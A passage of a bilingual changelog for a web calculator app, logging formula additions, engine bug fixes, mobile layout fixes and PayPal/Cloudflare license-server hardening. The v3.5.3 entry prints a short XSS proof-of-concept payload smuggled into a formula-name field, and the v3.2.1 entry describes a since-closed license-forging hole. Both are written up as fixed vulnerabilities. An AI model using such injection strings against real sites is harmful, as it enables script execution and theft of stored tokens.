- **公式庫 3 條內嵌常數同步精確值**，避免按鈕與公式給出不同答案：庫倫力 `8.99e9` → `8.9875518e9`、萬有引力 `6.674e-11` → `6.6743e-11`、普朗克能量 E=hf `6.626e-34` → `6.62607015e-34`。
- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.8`**。

### Verified

- 全面點擊測試 5 分頁：計算（四則 / 5 分類函數 / 進位換算 / DEG-RAD）、單位（8 類換算 + 雙向同步 + 互換）、匯率（16 幣雙向同步 + 重整 + 帶回）、公式（88 條 + 分類篩選 + 自建 CRUD）、儲存（歷史 + 刪除 + CSV）、Header（語言 / 主題 / 說明 / 繪圖 / Pro）—— 全綠。
- 修正後物理常數 8 顆全數顯示精確值且無尾隨零；公式 E=hf（f=1e15）→ 6.62607015e-19、萬有引力與按鈕一致。
- console 全程零 error。

## [3.5.7] - 2026-05-21 — 公式資料一致性審查：命名修正 + 文件去過時

對公式庫與對外文件做了一輪一致性深審，揪出一個公式命名錯誤與多處過時敘述，一次性修齊。**無 calculate engine 邏輯變更**。

### Fixed

- **目標心率公式掛錯名「Karvonen」**：id 93 公式 `(220-a)*intensity/100` 實為「最大心率百分比法」（%MaxHR），並非 Karvonen 法——真正的 Karvonen 公式需靜息心率變數 `(MaxHR−RHR)×強度+RHR`。公式本身為廣為使用的合法估算法，錯的僅是名稱。改名 `目標心率(%最大心率)`，README guide 同步修正。
- **index.html 說明區過時數字**：公式庫說明「共 83 條」→「88 條」；說明 Modal「47 條公式、五大分類」→「88 條、六大分類」（原本漏列「健康」分類）。

### Changed

- **README 公式分類總覽表重建**（中／英文版）：原表分類為「幾何 / 物理 / 化學 / 財務」，與實機 6 個分類 tab 完全不符——實機為 `數學 32 / 物理 17 / 金融 11 / 工程 11 / 健康 9 / 科學 8`（共 88）。改為對齊實機分類，並補上實際範例公式。
- **docs/FORMULAS.md 重建**：該檔自 v1.0.0（2026-04-21）起從未更新，缺 v1 後新增的數十條公式與整個健康分類，而 README 卻指向它稱「完整公式清單」。重建為按 6 分類組織的完整 88 條清單（id / name / expr / vars），並補上健康公式的方法依據說明（Mifflin-St Jeor / Deurenberg 1991 / %MaxHR / 30 ml·kg⁻¹）。

## [3.5.6] - 2026-05-20 — calculate engine 邊界 audit + 健康分類 +5 公式

承 v3.5.5 修完兩個 calculate engine latent bug 後，主動跑了一輪數值邊界陷阱 audit（12 個 case：大整數溢位、浮點誤差、除以零、log/sqrt 邊界、factorial 邊界、toFixed/toPrecision 邊界、e/π 常數、科學記號）—— **engine 健全、無需修補**。同時拓展健康分類 +5 條公式，公式庫 83 → **88 條**、健康分類 4 → **9 條**。

### Added

- **+5 條健康公式**：
  - **id 94 / 95：TDEE 每日總消耗（男 / 女）**：`(10*w+6.25*h-5*a±α)*activity`，含活動係數變數（久坐 1.2 / 輕活 1.375 / 中活 1.55 / 高活 1.725 / 極高 1.9）。例：70kg/170cm/30 男活動係數 1.55 → TDEE = 2507.125 大卡/日。
  - **id 96 / 97：體脂率 Deurenberg（男 / 女）**：`1.20*BMI + 0.23*age - 16.2(男) / -5.4(女)`，公開公式，無須儀器即可估算。例：70kg/170cm/30 男 → 19.77% 落正常上緣；55kg/160cm/25 女 → 26.13% 落正常範圍。
  - **id 98：每日水分需求**：`w*30`（ml），每公斤體重 30ml 經驗法則。70kg → 2100ml。

### Verified (audit no fixes needed)

calculate engine 邊界陷阱 audit（12 case 全合理）：

| 類別 | Case | 行為 |
|---|---|---|
| 大整數 | `170!` = 7.257e+306 ✓、`171!` → Error（Inf）✓ | toPrecision string |
| 大整數 | `nCr(170,85)` = 9.14e+49 ✓、`nCr(200,100)` → Error（Inf/Inf=NaN，可改用 multiplicative formula 但低使用率，列 Known/Next）| 規範 |
| 浮點誤差 | `0.1+0.2` = 0.3（toFixed 自動規整）✓ | 正確 |
| 浮點極限 | `sin(180°)` = 1.22e-16（design intent，浮點 EPSILON 量級）| 不修，列 Known |
| 邊界 | `1/0`、`log(0)`、`log(-1)`、`sqrt(-1)`、`mod 0` → Error ✓ | 一致 |
| factorial | 負數、小數 → Error ✓ | 一致 |
| toFixed/toPrecision | 1e-6 / 9e-7 / 1.1e-6 / 1e15 / 9.9e14 邊界全對 ✓ | v3.5.5 修正成功 |
| 常數 | e=2.718、π=3.14159、1.5e3=1500 ✓ | 不衝突 |

### Verified (v3.5.6 new + regression)

- **5 條新公式**：TDEE 男 2507.125 ✓、TDEE 女 1959.2 ✓、體脂男 19.77% ✓、體脂女 26.13% ✓、水分 2100ml ✓。
- **既有公式回歸 7 條**：普朗克 3.313e-19、萬有引力 1.982e+20、BMI 24.22、BMR男 1617.5、圓面積 78.54、勾股 5、複利 16470.09 全綠。
- console 全程零 error、健康 tab 9 卡完整顯示。

### Changed

- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.6`**。

### Known / Next

- **`nCr(n, r)` 大值優化**（low priority）：目前走 `factorial(n)/factorial(r)/factorial(n-r)`，n>170 因 factorial Inf 而失效。改用 multiplicative formula（n*(n-1)*…*(n-r+1)/r!，逐項累乘除）可算到 n>1000。實際使用率低、暫不修。
- **`sin(180°)` 浮點殘渣顯示為 `1.22e-16`**：threshold-snap 為 0 對「真正極小結果」(如 1e-15) 有誤殺風險、暫不修。

---

## [3.5.5] - 2026-05-20 — +20 公式 / 新增「健康」分類 / 修 calculate engine 兩個 latent bug

公式庫從 63 條擴充到 **83 條（+32%）**，新增**健康**分類為第 6 個 group（原 5 個：數學/工程/科學/物理/金融）。SEO/AdSense 視角增傠 guide section、新增 v3.5.5 公式速覽段落。**意外揪出 calculate engine 兩個長期潛伏的 bug**（Math.E 誤替 + toFixed underflow），趁此版一起修。

### Added

- **+20 條新公式**（按 SEO/實用排序）：
  - **數學 7 條**（id 26-29, 58-60）：海倫公式（已知三邊求三角形面積）、扇形面積、扇形弧長（兩者皆自動度→弧度換算）、等差數列和、等比數列和、二維向量長度、二維向量內積。
  - **金融 2 條**（id 48-49）：實質年利率 EAR（揭穿名目利率 vs 實際成本）、損益平衡點 BEP（創業必備）。
  - **工程 2 條**（id 61-62）：LC 諧振頻率、RC 截止頻率（濾波器與震盪電路設計）。
  - **物理 5 條**（id 82-86）：向心加速度、彈簧簡諧運動週期、彈簧位能、普朗克量子能量 E=hf、動摩擦力。
  - **健康 4 條**（id 90-93，**新分類**）：BMI 身體質量指數（自動 cm→m）、BMR 基礎代謝率（採 Mifflin-St Jeor 公式，男女各一條）、目標心率 Karvonen 法。
- **新分類「健康」**：`formula-cats` tab 新增按鈕、CSS `.group-健康` 配橘色 `#fb923c`、與既有 5 group 視覺區分。
- **`varDescMap` 補 20 條變數說明 + `varTransform` 補 3 條換算**（扇形 theta 度→弧度、EAR r 百分比→小數）。
- **guide section SEO 內容**：原「47 條公式」更新為「83 條公式」+「六大領域」、新增「v3.5.5 新增公式速覽」章節（4 段：數學進階 / 健康自我量測 / 物理工程 / 金融進階），含 BMI 計算實例（70kg/170cm → BMI 24.22）強化 AdSense indexable 內容。

### Fixed

- **🔴 calculate engine — Math.E 誤替為科學記號**（latent，自始即有）：原 regex `(?<![a-zA-Z])e(?![a-zA-Z0-9])` 對 `6.626e-34` 中的 `e` 誤匹配（lookbehind 沒排除數字），替換成 `Math.E` 後表達式變 `6.626Math.E-34*...`，整個 calculate throw → handler 跳過寫 display → 普朗克公式顯示前次殘留值。修法：lookbehind 加數字排除 → `(?<![a-zA-Z0-9])e(?![a-zA-Z0-9])`。同時修復萬有引力（含 `6.674e-11`）、庫倫力（含 `8.99e9`）等含科學記號常數的公式。
- **🔴 calculate engine — toFixed(12) 對極小數字 underflow 為 0**（latent，自始即有）：原 `parseFloat(result.toFixed(12))` 對 `3.313e-19` 之類數值，`toFixed(12)="0.000000000000"` → parseFloat → 0。修法：`Math.abs(result)` 在 `[1e-6, 1e15)` 範圍仍走 `toFixed(12)`；超出範圍改用 `toPrecision(10)` 回字串，保留科學記號顯示（如 `"3.313e-19"`、`"1.982e+20"`）。
- **既有公式回歸**：e^x（id 19）、波耳能量（id 57）、庫倫力（id 78）、萬有引力（id 79）、圓面積（id 1）、勾股（id 11）、複利（id 39）端對端通過。

### Changed

- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.5`**：cache-first SW 必須 bump 讓既有使用者取得新公式 + bug fix。

### Verified

- 83 公式卡全部 render（v3.5.4 統一 escape pattern 仍在線）。
- v3.5.5 新增 20 條全部端對端通過：海倫(3,4,5)=6 ✓、扇形面積 r=10 θ=60°=52.36 ✓、等差和(1..10)=55 ✓、等比和(1,2,10)=1023 ✓、EAR(12%,12)=0.1268 ✓、LC(1mH,1μF)=5032.92Hz ✓、簡諧(m=1,k=4)=π ✓、普朗克 f=5e14=3.313e-19 ✓、BMI(70,170)=24.22 ✓、BMR男(70,170,30)=1617.5 ✓、目標心率(30,70)=133 ✓。
- 既有 7 條回歸通過：e^x(2)=7.389、波耳(n=1)=-13.6、庫倫(1μC,1μC,1m)=0.00899、萬有引力(地球月球)=1.982e+20、圓面積(r=5)=78.54、勾股(3,4)=5、複利(10000,5,12,10)=16470.09。
- 健康 tab 過濾正確顯示 4 卡、橘色 badge 配色與其他 5 group 區分。
- console 全程零 error。

### Known / Next

- 萬有引力 / 普朗克等極端數字現用 toPrecision(10) 科學記號 string 輸出，與 toFixed(12) number 輸出在 saved formulas 內 type 不一致（一個 string、一個 number）。對 UI 顯示無影響，但若日後 saved formulas 序列化或重新計算需考慮 type-aware 處理。

---

## [3.5.4] - 2026-05-20 — built-in 公式 render 統一 escape pattern（技術債清掃）

延續 v3.5.3 自建公式 XSS 修復——當時為避免擴大改動，built-in 公式 render（`renderFormulas()`）的同款不安全 `onclick=` 字串拼接 pattern 暫時保留為已知技術債（`builtInFormulas` 完全 dev-controlled、無使用者 injection 面）。本版統一兩條 render path 的 pattern，徹底清掃。

### Changed

- **built-in 公式 render 改用 `data-*` + `addEventListener` pattern（技術債清掃 / defense-in-depth）**：原 `renderFormulas()` 使用 `onclick="selectFormula(${f.id}, '${f.name}', '${f.expr}', ...)"` 內聯字串拼接，雖然 `builtInFormulas` 為 dev-controlled 無使用者 injection 面，但若日後加入含 `'` 的公式名稱會 break，且兩條 render path 不一致是維護負擔。**修法**：新增 `builtInFormulaItem()` + `bindBuiltInFormulaEvents()` 兩個輔助函式，與 v3.5.3 的 `customFormulaItem` / `bindCustomFormulaEvents` 結構完全對齊；name / expr / category / group 全部走 `escapeFormulaHtml()`；click 用 `addEventListener` 從 `data-formula-id` 反查物件後呼叫 `selectFormula`。
- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.4`**：cache-first SW 必須 bump 讓既有使用者取得新 render path。

### Verified

- 63 張 built-in 公式卡全部以 `data-formula-source="builtin"` render，inline onclick 殘留 0 個。
- 端對端：圓的面積 r=5 → 78.539816339745、勾股定理 a=3 b=4 → 5、複利終值 P=10000 r=5 n=12 t=10 → 16470.0949769028。
- 自建公式 path 完全未動，相關函式（`customFormulaItem` / `bindCustomFormulaEvents`）與行為皆保留。
- console 零 error。

### Known / Next

- 統計（Phase 7）與 3D 表面繪圖（Phase 8）仍待真實 Pro token 驗證內部渲染品質（自 v3.5.3 起延續）。

---

## [3.5.3] - 2026-05-20 — 深審剩餘賣點 + 結構/安全/UX 三修

繼 v3.5.2 完成手機響應式 Bug C 後，對 README 強調但尚未深審的賣點（函數繪圖 / 統計 / 3D / 公式庫 / Pro gate）做了瀏覽器逐功能實測。Pro gate（7 個：tangent / integral / slope / intersect / statistics / 3d / svg）全部正確攔截；free 功能（mark / PNG / special points / formula library / parametric sliders）端對端通過。

過程中揪出三個既存問題並一次性修復：1 個 CRITICAL 結構錯誤（SEO/Footer 長期不渲染）、1 個 CRITICAL 安全漏洞（自建公式 XSS）、1 個 MEDIUM UX 問題（`y=` 前綴）。

### Fixed

- **graphModal 結構吞噬 `<section id="guide">` + `<footer>`（CRITICAL）**：原 HTML 中 `</div>` 閉合位置錯誤，把整個 SEO 教學專欄（AdSense 素材！）與頁尾 trust signals（版權、商標、條款、隱私、聯絡）誤包進 `#graphModal` 內。後果：
  - modal **關閉**時（使用者 99% 時間）兩者整段 `display:none`，**從 site launch 起從未對使用者渲染**——SEO 內容白寫、AdSense 素材白配、footer trust signals 全失。
  - modal **開啟**時 flex row 把它們橫向擠成 3 欄，graph modal 自身 content 被壓到 344px（max-width 應為 1100px）。
  - **修法**：移動 `</div>` 閉合位置，讓 `section#guide` 與 `<footer>` 解放為 `<body>` 直接子孫。線上驗證 `curl https://boboidvtw.github.io/` 確認線上版本同樣中招，本修復同步生效。
- **自建公式 XSS 注入漏洞（CRITICAL，CWE-79）**：`customFormulaItem()` 用樣板字串把使用者輸入的 `f.name` / `f.expr` 直接拼進 `onclick="selectFormula('${f.name}', ...)"`。PoC：name 填入 `test', '', []); window.__xss_fired__ = true; selectFormula(0, 'h` → 點該公式即執行任意 JS。攻擊面包含竊取 localStorage（含 Pro JWT token、saved/customFormulas、exchangeRates）、覆蓋 `gateProFeature` 繞過 Pro gate。**修法**：捨棄 inline `onclick=` 字串拼接，改用 `data-formula-id` + `data-formula-action="select|delete"` 屬性 + 渲染後 `addEventListener` 綁定（`bindCustomFormulaEvents()`）；name/expr/group 全部走新增的 `escapeFormulaHtml()` 五字元 HTML escape。完整 CRUD 端對端回歸（add → click → calc `(4/3)*π*3³`=113.097 → delete）通過、XSS payload 不再執行（`xssFired: false`）。Built-in 公式 render 採同樣不安全 pattern 但 data dev-controlled、無使用者 injection 面，本次未動。
- **函數繪圖 `y=` / `f(x)=` 前綴被誤判為參數（MEDIUM）**：使用者很自然輸入 `y=x^2`，原 add 邏輯接受、清單顯示 `y = y=x^2`、額外建出 `y` slider（把 `y` 誤判為自由參數，因為 `y` 不在保留字表中）。**修法**：`tryAdd()` 在送入 `addGraphFunction()` 前先用 `/^\s*(?:y|f\s*\(\s*x\s*\))\s*=\s*/i` strip `y =` 與 `f(x) =` 前綴。回歸測試確認：`y=x^2` / `y = sin(x)` / `f(x) = x^3` 三種輸入皆 strip 為純表達式；合法的 `x^2+y^2`（無 `=`）完整保留並正確建出 `y` slider，未誤殺。

### Changed

- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.3`**：cache-first SW 必須 bump 才能讓既有使用者立即取得三項修復（特別是安全修復）。

### Verified

- viewport 1280×900 + 375×812 雙 viewport 驗證：modal 開啟時 content 取得完整 1100px、關閉時 `section#guide` + `footer` 在頁面底部正常渲染、手機 v3.5.2 浮動鍵列共存無回歸。
- Pro gate 7 個 + free 功能 4 個全部行為符合預期，無誤鎖、無誤通。
- 自建公式 XSS payload 不再執行，正常公式 CRUD + 計算流程完全保留。
- 繪圖 / 公式 / 計算 console 全程零 error。

### Known / Next

- 統計（Phase 7）與 3D 表面繪圖（Phase 8）內部渲染品質尚未驗證——`ProManager.isProActive` 是 `writable:false` 無法 mock，需真實 Pro token 才能測。列入下一個有 Pro 環境時的待辦。

---

## [3.5.2] - 2026-05-20 — 手機響應式 Bug C 修復

修復 v3.5.1 Known/Next 列出的「手機側邊欄被隱藏導致函式無法閉合括號」嚴重缺陷。手機是計算機主場景，此 bug 使所有 `sin( cos( log( exp( asin( ... ` 函式於手機完全不可用。本次以純 CSS 響應式重排修復，DOM 零改動、桌機零回歸。

### Fixed

- **手機 `( ) , π e` 無法輸入（Bug C，HIGH）**：≤768px 時 `.main-sidebar` 原為 `display:none`，整組常用鍵與「支援函數」說明、「即時匯率」panel 一併消失。所有需要閉合括號的函式（`sin(`、`cos(`、`log(`、`exp(`、`asin(`、`acos(`、`atan(`、`sinh(`、`cosh(`、`tanh(`、`sqrt(`、`floor(`、`ceil(`、`abs(`、`nCr(`、`nPr(`）於手機按下後**完全無法閉合**，皆回傳 `Error`。修復策略：DOM 零改動、純 CSS 響應式重排。≤768px 時 `.main-sidebar` 改為 `position: fixed` 底部浮動列（業界標準的 mobile keyboard 模式），只保留 5 顆關鍵鍵（π e ( ) ,）橫向 5 欄等寬佈局，按鈕 `min-height: 44px` 符合 Apple HIG / Material 觸控標準，半透明背景 + `backdrop-filter: blur(12px)` 配合深淺主題自動切換；「常用按鈕」h3 標題、「支援函數」說明區、「即時匯率」整個 panel 於手機隱藏（手機已有「匯率」tab 可看，help modal 已有支援函數列表）；`body` 加上 `padding-bottom: calc(72px + env(safe-area-inset-bottom))` 預留浮動列空間並支援 iPhone Home Indicator safe area。`z-index: 90` 低於所有 modal（≥1000），不影響 help / formula / graph modal 互動。

### Verified

- 端對端流程：手機 viewport 375×812 完整流程 `sin(45)`=0.707106781187（DEG）、`nCr(5,2)`=10 通過。
- viewport 320 / 375 / 768 / 1280 全部正常；media query 邊界 768px 精準切換。
- 深 / 淺主題視覺均正確、零 console error。
- 桌機 1280：sidebar 回到 `position: static`、`display: flex`，h3 / 支援函數 / 匯率 panel 全部正常顯示，`body` padding-bottom 還原為 20px，**零回歸**。

### Changed

- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.2`**：確保既有使用者立即取得本次修復（Service Worker 為 cache-first，舊版即會永久看不到修復）。

### Known / Next

- 函數繪圖 / 統計 / 3D 繪圖、公式庫實際套用流程、Pro gate 行為尚未深度審查，後續進行。

---

## [3.5.1] - 2026-05-20 — 進階模式審查修復

延續 v3.5.0 的使用性審查，深入測試先前未覆蓋的進位 / 工程 / 科學模式，修復 3 個影響功能可用性的問題（其中 1 個為 v3.5.0 引入的回歸）。所有修復經瀏覽器完整 UI 流程驗證、零回歸、零 console error。

### Fixed

- **工程模式 `mod` 鍵失效（HIGH，v3.5.0 回歸）**：v3.5.0 的百分比預處理會把 `mod` 鍵產生的 `%` 字元（`7%3`）誤判為百分比改寫成 `(7/100)3` → `Error`。修正：`mod` 鍵改插入 ` mod ` 文字（顯示更清楚），`calculate()` 在百分比處理**之後**才將 ` mod ` 轉為 JS 取模 `%`，兩者不再衝突。`7 mod 3`=1、`10 mod 4`=2；百分比 `50%`=0.5、`100+5%`=105 不受影響。
- **進位模式 HEX 缺 `C` 鍵（HIGH）**：十六進位需要 A–F，但按鍵盤漏掉 `C`，使用者無法輸入任何含 C 的十六進位數（`C0`、`CAFE`、顏色碼 `#CCC` 等）。引擎本身支援（`BASE_VALID_DIGITS.HEX` 含 C、enable 邏輯資料驅動），純 HTML 缺按鈕。補回 `C` 並重排佈局為 `A B C CLR / D E F ←`。`C0`→DEC 192 正確。
- **`nCr(n,r)` / `nPr(n,r)` 無法輸入參數（HIGH）**：科學模式有 `nCr(` `nPr(` 鍵，引擎支援，但全站沒有逗號 `,` 按鈕，使用者無法輸入參數分隔符，功能形同虛設。於側邊欄「常用按鈕」區（與 `( )` 同組）新增 `,` 鍵。`nCr(5,2)`=10、`nPr(5,2)`=20 完整 UI 流程可用。

### Changed

- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.1`**：確保既有使用者立即取得本次修復（Service Worker 為 cache-first）。

### Known / Next

- `( ) π e ,` 等鍵於小螢幕被隱藏的響應式問題已於 v3.5.2（2026-05-20）修復。
- 函數繪圖 / 統計 / 3D 繪圖、公式庫套用與 Pro gate 尚未深度審查，後續進行。

---

## [3.5.0] - 2026-05-19 — 計算核心修復 + 角度模式

本次為一輪完整的使用性體驗審查（瀏覽器逐功能實測），修復 4 個影響核心計算的問題並新增角度模式。所有修復皆經瀏覽器驗證、零回歸、零 console error。

### Fixed — 計算引擎

- **`%` 百分比運算符完全失效（CRITICAL）**：主鍵盤 `%` 鍵任何用法（`50%`、`100+5%`）皆回傳 `Error`。`calculate()` 原本未處理 `%`，原樣送入 JS eval（JS `%` 為 modulo 二元運算子，`50%` 為語法錯誤）。新增百分比語意預處理，採標準計算機行為：`50%`→0.5、`100+5%`→105、`200−10%`→180、`200×10%`→20、`80÷50%`→160。
- **函數鍵在初始狀態無法使用（HIGH）**：顯示為初始 `0` 時按 `sin( cos( tan( log( ln( √(` 會產生無效的 `0sin(…)` → `Error`。任何「以函數開頭」的算式第一步即失敗。修正輸入處理：顯示為 `0` 時，除小數點外的按鍵（含函數鍵、左括號）皆取代前導 0。
- **`√` 雙重替換隱藏 bug**：上述修復後暴露的既有問題——`√`→`Math.sqrt` 後又被 `sqrt(`→`Math.sqrt(` 二次替換成 `Math.Math.sqrt(`。改為 `√`→`sqrt` 統一走單一替換路徑。`√(16)`=4、`9+√(16)`=13 正常。
- **單位換算結果框空白（MEDIUM）**：換算結果 ≥ 1000 時，`formatUnitVal` 以 `toLocaleString` 產生含千分位逗號的字串，賦值給 `type="number"` 的 input 會被瀏覽器拒絕並清空。兩個單位 input 改為 `type="text"` + `inputmode="decimal"`，反向換算 parse 時去除逗號。雙向換算、類別切換、溫度特殊轉換皆正常。

### Added — 角度模式

- **DEG / RAD 切換鈕**（頂部工具列），狀態以 `localStorage` 持久化，**預設 DEG**（角度）。三角函數依模式自動換算：DEG 模式 `sin(90)`=1、`tan(45)`=1（符合一般使用者預期）；RAD 模式 `sin(π÷2)`=1。反三角函數結果亦依模式回傳角度或弧度。雙曲函數不受影響（恆為弧度）。

### Changed

- **`sw.js` `CACHE_NAME` bump 至 `sigma-calc-v3.5.0`**：Service Worker 為 cache-first，若不更新快取名稱，既有使用者會繼續取得舊版 `index.html`，看不到本次修復。bump 後 `activate` 會清除舊快取，修復對所有使用者立即生效。

---

## [3.4.0] - 2026-05-16 — IP protection + Worker hardening

### Added — Legal / IP protection layer

- **`NOTICE.md`** — supplements MIT License with explicit trademark reservations (`∑ Calc™`, `∑ Super Calculator™`, `∑ Calc Pro™`, `MoneyAI168™`), SaaS service scope clarification, visual asset reservation, and operated-domain list.
- **`TERMS.md`** — comprehensive English Terms of Service covering acceptable use (no reverse engineering, no API abuse, no impersonation, no payment circumvention), Pro subscription terms (pricing, billing, refunds, revocation), forks-must-rename rule, privacy disclosure, liability limitation, and Republic of China (Taiwan) governing law.
- **README.md / README_EN.md** — License sections expanded with trademark list, MIT-not-covered scope, `legal@moneyai168.com` contact.
- **`docs/terms.html`** — Section 3 (Intellectual Property) rewritten to list MoneyAI168 trademarks and link to NOTICE.md / TERMS.md.
- **`index.html` footer** — added trademark notice line (`∑ Calc™, ∑ Super Calculator™, ∑ Calc Pro™ and MoneyAI168™ are trademarks of MoneyAI168. Pro subscription powered by the official MoneyAI168 service only.`).

### Changed — Custom domain migration

- **Live Worker now served via `https://api.moneyai168.com`** (Cloudflare Workers Custom Domain bound to `supercalc-license-validator`). `js/pro-config.js` `LIVE.WORKER_URL` switched from `supercalc-license-validator.boboidvtw.workers.dev` to the custom domain. The `*.workers.dev` URL stays active in parallel (zero-downtime; no breaking change).
- Removed a stale conflicting manual `api` CNAME (pointed to a non-existent cross-account `supercalc-license.moneyai168.workers.dev` → Cloudflare error 1014) that had been blocking Custom Domain creation. Sandbox stays on `*.workers.dev`.
- A custom domain (a real Cloudflare zone) is also the prerequisite for any future WAF rule escalation on `/webhook/paypal`.

### Added — Worker v2.2.0 KV-based rate limiting

- **`/license/issue` dual-layer rate limiting**, fixed-window counters stored in the existing `LICENSES` KV namespace:
  - per `cf-connecting-ip` — 10 req / 60s (anti-DDoS / bot)
  - per `subscriptionId` — 5 req / 3600s (anti license-factory abuse if a subscription ID is leaked)
- **429 response** with dynamic `Retry-After` (computed from window remainder) and `scope` field (`per-ip` / `per-subscription`).
- **KV failure → graceful degrade**: on any KV error the request is allowed (never blocks a legitimate user).
- Rate values are code constants (`RL_ISSUE_*`); tune by editing + redeploying.

#### Why KV instead of Cloudflare Rate Limiting bindings

- v2.1.0 first attempted Cloudflare Rate Limiting bindings. Empirically verified (Sandbox, 2026-05-16): when a Worker is deployed via the **Dashboard editor**, the binding's counter **only persists within a single Worker invocation, not across separate requests** — making it useless for real rate limiting (which is inherently cross-request).
- The binding is also hard-locked to 10s/60s periods, so the desired 3600s per-subscription window was impossible.
- KV-based counters work cross-request, support arbitrary windows (incl. 3600s), and are fully in-code/testable. Trade-off: approximate under concurrent bursts (KV eventual consistency, no atomic increment) — acceptable for the real threat model (sustained abuse). Precise quota would require Durable Objects (future upgrade path, needs wrangler deploy).

### Added — Worker v2.3.0 webhook source-IP observation (log-only)

- **`/webhook/paypal` source-IP observation**: each webhook's `cf-connecting-ip` is matched against PayPal's 8 published CIDR ranges; non-matching sources emit a `[webhook-ip-observe]` `console.warn` (event type + id) but are **never blocked**.
- Rationale: PayPal **officially discourages IP allowlisting** (IPs change without notice; a hard block risks silently dropping real webhooks → subscriptions never activate → revenue loss). Signature verification (already implemented via `verify-webhook-signature`) remains the primary, PayPal-recommended defense. This layer is purely observational — collect real traffic data before deciding whether to escalate to a hard block.
- A Cloudflare WAF custom rule cannot target `*.workers.dev` (not a zone in the account), so the check is implemented **in-Worker** instead — works now, version-controlled, unit-tested (13/13 CIDR boundary cases).
- PayPal CIDRs are a code constant (`PAYPAL_WEBHOOK_CIDRS`); IPv4-only matching (PayPal's published ranges are all IPv4).

### Notes

- Source code remains MIT-licensed; this release does not change the LICENSE file. New protection layers operate alongside MIT, covering what MIT explicitly does not (trademarks, brand identity, operated SaaS service).
- No extra Cloudflare binding required for rate limiting. Any previously-added `RATE_LIMIT_ISSUE_*` bindings can be deleted (code no longer references them).
- A future hard-block escalation for `/webhook/paypal` would belong on the custom domain (`api.moneyai168.com`) as a WAF rule, gated on observation data showing all real PayPal traffic stays within the published CIDRs.
- Still pending in this milestone: custom domain migration to `api.moneyai168.com`.

---

## [3.3.1] - 2026-05-14 — Webhook timing retry fix

### Fixed

#### Retry on `403 + currentStatus='pending'`
- **Bug discovered during sandbox e2e test**: PayPal often sends `BILLING.SUBSCRIPTION.CREATED` (status=`pending`) before `BILLING.SUBSCRIPTION.ACTIVATED` (status=`active`). Old `issueWithRetry` only retried on `404`, so it gave up during the pending→active transition window, leaving the user with a "subscription not active" error even though the subscription was about to become active.
- **Fix**: `issueWithRetry` now also retries when `err.status === 403` AND `err.body.currentStatus === 'pending'`.
- Terminal statuses (`cancelled`/`suspended`/`expired`/`refunded`/`disputed`) still fail fast without retry.
- Error UI in `paypal-integration.js` now shows the manual "retry" link for both `404` and `403+pending` scenarios.

### Verified

- Sandbox subscription `I-R2SFXX7U1SW2` reached `status=active` after PayPal's webhook flow completed.
- Manual `ProManager.activateSubscription()` succeeded against the active KV record.
- PayPal `BILLING.SUBSCRIPTION.CANCELLED` webhook arrived within 5 seconds and the previously-issued JWT was invalidated by the next `/license/validate` call.

---

## [3.3.0] - 2026-05-14 — Sandbox / Live dual-mode

### Added

#### 🧪 Sandbox / Live dual-mode switching
- **Query-param toggle**: visit `https://boboidvtw.github.io/?sandbox=1` to switch the entire frontend to PayPal Sandbox + Sandbox Worker.
- **Orange banner** at the top of the page when sandbox mode is active, with a one-click "switch back to Live" link.
- **`localStorage` key isolation**: sandbox tokens use `_sb` suffix (`super_calc_pro_license_sb`) so test data never contaminates the production license.
- **Dynamic PayPal SDK loading**: the SDK script tag is no longer hardcoded in `index.html`. `paypal-integration.js` now injects the correct client-id based on mode (Live or Sandbox), enabling clean mode switching without rebuilding the page.

#### Sandbox infrastructure (deployed alongside Live)
- **Separate Cloudflare Worker**: `supercalc-license-validator-sandbox.boboidvtw.workers.dev`
- **Separate KV namespace**: `LICENSES_SANDBOX` (`1378f7ee501c4cc3921f1b8f80d1650d`)
- **Separate PayPal Webhook**: ID `1L223054P9312233E`, points to the sandbox worker
- **Sandbox env vars**: `PAYPAL_API_BASE=https://api-m.sandbox.paypal.com`, sandbox `PAYPAL_CLIENT_ID` / `PAYPAL_CLIENT_SECRET`
- Shared `SECRET_KEY` with Live (JWTs from each environment can't cross-validate due to different worker URLs anyway).

### Changed

- `index.html` no longer ships the static `<script src="paypal.com/sdk/js?client-id=...">` tag. `paypal-integration.js` loads the SDK dynamically with the active mode's client-id.
- `pro-config.js` exposes new flags: `IS_SANDBOX`, `PAYPAL_CLIENT_ID`, and mode-aware `STORAGE_KEY` / `SUBSCRIPTION_KEY` / `VERIFIED_AT_KEY`.

### Why sandbox mode exists

PayPal blocks Taiwan-registered seller accounts from receiving payments from Taiwan-registered buyer accounts (including guest checkout). Live self-testing is therefore impossible from the seller's own market. Sandbox mode allows full end-to-end verification using PayPal-provided test buyer accounts at zero cost.

---

## [3.2.1] - 2026-05-14 — KV-backed license validation (security upgrade)

### 🚨 Security: Closes critical license-forging vulnerability

In v3.2.0, `/license/issue` accepted **any** `subscriptionId` and signed a JWT for it, with no verification that the ID corresponded to a real PayPal subscription. Anyone could `POST /license/issue` with a fake ID and receive a valid Pro license. **This release closes that hole.**

### Added

#### Cloudflare Worker v2.0.0 (KV-backed)
- **`LICENSES` KV namespace** stores subscription state by `subscriptionId`:
  - `status`: `pending` / `active` / `cancelled` / `suspended` / `expired` / `refunded` / `disputed`
  - `planId`, `activatedAt`, `cancelledAt`, `lastEventType`, `lastEventId`, etc.
- **`POST /webhook/paypal`**: receives PayPal webhook events
  - Verifies signature via PayPal `/v1/notifications/verify-webhook-signature` API (requires real PayPal cert — attackers can't forge)
  - Idempotency: event IDs cached in KV for 30 days, duplicates return `{status: 'duplicate'}`
  - Maps 8 subscription events + 3 payment/dispute events into KV state updates
- **`POST /license/issue` now requires KV record**: only signs a JWT if `status === 'active'` in KV. Fake IDs return `404`. Pending/cancelled IDs return `403`.
- **`POST /license/validate` checks KV on every call**: even if the JWT signature is valid and not expired, validation fails if KV shows the subscription was cancelled. This is the **instant revocation** mechanism.
- **`GET /subscription/:id`**: debug endpoint to inspect KV state.
- **Short-lived JWT**: lifetime reduced from 1 year → 7 days. Combined with KV-backed validate, revocation propagates within ≤6 hours (reverify interval).
- **OAuth token caching**: PayPal `client_credentials` token cached in KV for 8 hours to avoid token churn.

#### Frontend (5 modules, +123 lines)
